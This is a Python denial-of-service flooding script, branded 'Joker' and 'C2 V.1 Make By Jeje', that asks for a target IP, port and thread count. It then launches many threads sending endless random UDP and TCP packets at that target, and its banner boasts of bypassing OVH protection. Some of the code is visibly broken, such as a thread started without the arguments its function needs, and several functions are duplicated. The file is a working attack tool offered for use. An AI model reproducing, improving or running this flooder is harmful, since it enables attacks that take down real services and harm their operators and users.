#!/usr/bin/env python3
#Code by JEJE
import random
import socket
import threading
import socket
import argparse
import sys
from time import time as tt
import os
import re
import urllib.request
import asyncio

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"]

os.system("clear")
logo = """
 \033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - - Joker By Kazzie\033[36m@Exam Commity \033[35m- - - - - - -║
\033[35m                ║\033[32m  - - - Type \033[36mhelp\033[35m to see the Help Menu - - - - ║
\033[35m                ╚═══════════════════════════════════════════════╝


\033[35m                    ╔════════════════════════════════════════╗
\033[35m                    ║\033[32m- -Connection Has Been \033[36m(Bypassh Ovh?)- -\033[35m║
\033[35m                    ╚════════════════════════════════════════╝
"""
CRED2 = '\33[91m'
print(CRED2 + logo + CRED2)
print("C2 V.1 Make By Jeje")
ip = str(input("\033[94m Ip target \033[1;31;40m  ====> : "))
port = int(input(" \033[94mPort Target \033[1;31;40m====> : "))
choice = str(input(" \033[94mMetods \033[1;31;40m     ====> : "))
times = int(input(" \033[94mPaket \033[1;31;40m      ====> : "))
threads = int(input("\033[94m Threads \033[1;31;40m    ====> : "))
def run():
	data = random._urandom(1460)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("packet to %s throught port:%s"%(ip,port))
		except:
			s.close()

def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    fmt = 'Tok..Tok Paket By Jeje {ip} {port} {times} {threads} Yahhaha MT.'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports',
        time='{time} seconds'.format(time=time) if str(time).isdigit() else 'unlimited time',
        size=size
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(65500, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 6555)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('Attack finished.')

def run2():
	data = random._urandom(1180)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("packet to %s throught port:%s"%(ip,port))
		except:
			s.close()

def run3():
	data = random._urandom(1024)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("packet to %s throught port:%s"%(ip,port))
		except:
			s.close()

def run4():
	data = random._urandom(1180)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("packet to %s throught port:%s"%(ip,port))
		except:
			s.close()

def run5():
	data = random._urandom(1024)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("packet to %s throught port:%s"%(ip,port))
		except:
			s.close()

def run6():
	data = random._urandom(1180)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("packet to %s throught port:%s"%(ip,port))
		except:
			s.close()

def run7():
	data = random._urandom(1024)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("packet to %s throught port:%s"%(ip,port))
		except:
			s.close()

def run8():
	data = random._urandom(1180)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("packet to %s throught port:%s"%(ip,port))
		except:
			s.close()

for y in range(threads):
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = attack)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()